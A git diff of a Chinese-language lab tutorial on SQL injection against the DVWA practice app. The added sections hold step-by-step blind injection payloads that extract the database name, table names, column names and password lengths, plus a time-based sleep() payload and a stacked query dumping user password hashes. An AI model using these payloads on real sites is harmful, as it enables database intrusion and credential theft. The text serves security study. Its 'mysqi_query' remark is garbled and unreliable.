@@ -285,13 +285,13 @@ ERROR 1105 (HY000): XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882cf9'
 
 ![](http://img.wukaipeng.com/2023/1007-083414-image-20231007083414517.png)
 
-存在返回 `User ID exists in the database.`，不存在返回`User ID is MISSING from the database.`
+存在返回 `User ID exists in the database.`，不存在返回 `User ID is MISSING from the database.`
 
-1. 判断是否存在注入漏洞。
+1️⃣ 判断是否存在注入漏洞。
 
 可以通过下列语句判断是否存在注入漏洞：
 
-|      | 语句           | 结果    |
+|      | 语句          | 结果    |
 | ---- | -------------- | ------- |
 | 1    | `1`              | exists  |
 | 2    | `'`            | MISSING |
@@ -304,45 +304,270 @@ ERROR 1105 (HY000): XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882cf9'
 
 最后 5、6 步骤成立则说明存在字符串注入。
 
-2. 推断数据库名称
+2️⃣ 推断数据库名称
 
 首先利用 `length()` 推断数据库长度
 
 ```sql
-1' and length(database()) > 10 # ❌ MISSING
-1' and length(database()) > 5 # ❌ MISSING
-1' and length(database()) > 3 # ✅ exists
-1' and length(database()) = 4 # ✅ exists
+1' and length(database()) > 10 #
+ ❌ MISSING
+
+1' and length(database()) > 5 # 
+ ❌ MISSING
+
+1' and length(database()) > 3 #
+ ✅ exists
+
+1' and length(database()) = 4 #
+ ✅ exists
 ```
 
 接着利用 `substr()` 和 `ascii()`，逐一推断数据库的字符组成
 
 ```sql
-1' and ascii(substr(database(), 1, 1)) > 88 # ✅ exists
-1' and ascii(substr(database(), 1, 1)) > 98 # ✅ exists
-1' and ascii(substr(database(), 1, 1)) > 100 # ❌ MISSING
-1' and ascii(substr(database(), 1, 1)) = 100 # ✅ exists
+1' and ascii(substr(database(), 1, 1)) > 88 # 
+ ✅ exists
+
+1' and ascii(substr(database(), 1, 1)) > 98 # 
+ ✅ exists
+
+1' and ascii(substr(database(), 1, 1)) > 100 # 
+ ❌ MISSING
+
+1' and ascii(substr(database(), 1, 1)) = 100 # 
+ ✅ exists
 ```
 
 通过上述操作，推断出数据库名称为 `dvwa`。
 
+3️⃣ 推断表名
+
+3️⃣➡️1️⃣ 首先推断表的个数
+
+```sql
+1' and (select count(table_name) from information_schema.tables where table_schema=database()) > 10; #
+ ❌ MISSING
+
+1' and (select count(table_name) from information_schema.tables where table_schema=database()) > 5; #
+ ❌ MISSING
+
+1' and (select count(table_name) from information_schema.tables where table_schema=database()) > 2; #
+ ❌ MISSING
+
+1' and (select count(table_name) from information_schema.tables where table_schema=database()) = 2; # 
+ ✅ exists
+```
+
+`dvwa` 数据库表的个数为 `2`
+
+3️⃣➡️2️⃣ 接着推断第一张表的名称长度
+
+```sql
+1' and length((select table_name from information_schema.tables where 
+table_schema=database() limit 0,1))>10;#
+ ❌ MISSING
+
+1' and length((select table_name from information_schema.tables where 
+table_schema=database() limit 0,1))>5;#
+ ❌ MISSING
+
+1' and length((select table_name from information_schema.tables where 
+table_schema=database() limit 0,1))>8;#
+ ❌ MISSING
+ 
+1' and length((select table_name from information_schema.tables where 
+table_schema=database() limit 0,1))=9;#
+ ✅ exists
+
+## 也可以写成：
+1' and length(substr((select table_name from information_schema.tables where 
+table_schema=database() limit 0,1),1))=9;#
+ ✅ exists
+```
+
+ 第一张表名长度为 `9`
+
+3️⃣➡️3️⃣ 依次推断第一张表的名称的 9 个字符
+
+```sql
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>88;#
+ ✅ exists
+
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>105;#
+ ❌ MISSING
+
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>96;#
+ ✅ exists
+
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>101;#
+ ✅ exists
+
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>103;#
+ ❌ MISSING
+
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=102;#
+ ❌ MISSING
+
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103;#
+ ✅ exists
+```
+
+可得第一张表的第一个字符 ASCII 码为 103，对应字符为 `g`
+
+依次推断，第一张表的名称为 `guestbook`
+
+同理，得到第二张表的名称为 `users`
+
+4️⃣ 推断表中的字段名
+
+4️⃣➡️1️⃣ 推断 users 表的字段个数
+
+```sql
+1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')>10;#
+ ❌ MISSING
+
+1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')>5;#
+ ✅ exists
+
+1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')>8;#
+ ❌ MISSING
+
+1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=8;#
+ ✅ exists
+```
+
+4️⃣➡️2️⃣ 推断 users 表中的字段名
+
+字段名比较多的情况下，再一个一个推断比较费劲，可以使用字典的方式，比如我们要获取用户名和密码的话，可用字典：
+
+- 用户名：username/user_name/uname/u_name/user/name/... 
+- 密码：password/pass_word/pwd/pass/...
+
+```sql
+1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='username')=1;#
+ ❌ MISSING
+
+1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='user_name')=1;#
+ ❌ MISSING
+
+1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='uname')=1;#   
+ ❌ MISSING
+
+1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='u_name')=1;#
+ ❌ MISSING
+
+1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='user')=1;#
+ ✅ exists
+```
+
+`users` 表中存在字段 `user`
+
+```sql
+1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='password')=1;#   
+ ✅ exists
+```
+
+`users` 表中存在字段 `password`
+
+5️⃣ 获取表中的字段值
+
+5️⃣➡️1️⃣ `user` 的字段值
+
+```sql
+1' and length((select user from users limit 0,1))>10;#
+ ❌ MISSING
+
+1' and length((select user from users limit 0,1))>5;#
+ ❌ MISSING
+
+1' and length((select user from users limit 0,1))>3;#
+ ✅ exists
+
+1' and length((select user from users limit 0,1))=4;#
+ ❌ MISSING
+ 
+1' and length((select user from users limit 0,1))=5;#
+ ✅ exists
+```
+
+先判断字段值的长度为 5，然后再用 ASCII 码方式破解
+
+5️⃣➡️2️⃣ `password` 的字段值
+
+```sql
+1' and length(substr((select password from users limit 0,1),1))>10;#
+ ✅ exists
+
+1' and length(substr((select password from users limit 0,1),1))>20;#
+ ✅ exists
+
+1' and length(substr((select password from users limit 0,1),1))>40;#
+ ❌ MISSING
+
+1' and length(substr((select password from users limit 0,1),1))>30;#
+ ✅ exists
+
+1' and length(substr((select password from users limit 0,1),1))>35;#
+ ❌ MISSING
+
+1' and length(substr((select password from users limit 0,1),1))>33;#
+ ❌ MISSING
+
+1' and length(substr((select password from users limit 0,1),1))=32;#
+ ✅ exists
+```
+
+先判断字段值的长度为 32，这么长那看来密码是用 md5 加密，再用 ASCII 码方式破解花费的时间需要比较长
 
 
 
+#### 时间盲注
 
+界面返回只有返回 true（比如页面提交信息之后，只返回“感谢你的提交”）没有其他信息。
 
+可以通过 `if(condition, true_execution, false_execution) 和 ` `sleep(second)` 函数，通过时间延迟来推断。
 
+```sql
+1' and if(ascii(substr(database(),1,1))=100,sleep(5),1);#
+```
 
+后续过程同布尔盲注。
 
+### 堆叠查询注入
 
+批量执行 SQL 语句
 
+```sql
+mysql> show databases;select user, password from users;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| dvwa               |
+| mysql              |
+| performance_schema |
++--------------------+
+4 rows in set (0.00 sec)
 
++---------+----------------------------------+
+| user    | password                         |
++---------+----------------------------------+
+| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 |
+| gordonb | e99a18c428cb38d5f260853678922e03 |
+| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b |
+| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 |
+| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 |
++---------+----------------------------------+
+5 rows in set (0.00 sec)
+```
 
+使用条件：为了防止堆叠注入，一些网站的 API、数据库引擎或者权限会做限制，一次只能执行一条 SQL 语句。比如 PHP 为了防止 SQL 注入，会调用 `mysqi_query()` 函数，只能执行一条语句。
 
+### 二次注入
 
+二次注入指数据库在存入数据时做了校验和处理，但是在取出数据时没有做校验和处理，导致的二次注入。
 
-
-
+![](http://img.wukaipeng.com/2023/1010-085957-image-20231010085956378.png)
 
 
 
